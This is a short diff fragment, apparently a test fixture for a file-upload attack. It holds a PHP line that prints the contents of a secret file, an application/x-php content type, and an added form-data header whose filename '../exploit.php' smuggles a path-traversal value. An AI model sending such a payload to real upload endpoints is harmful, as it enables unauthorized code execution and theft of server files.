@@ -1,3 +1,5 @@
 <?php echo file_get_contents('/path/secret.txt'); ?>
 
 content-type: application/x-php
+
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
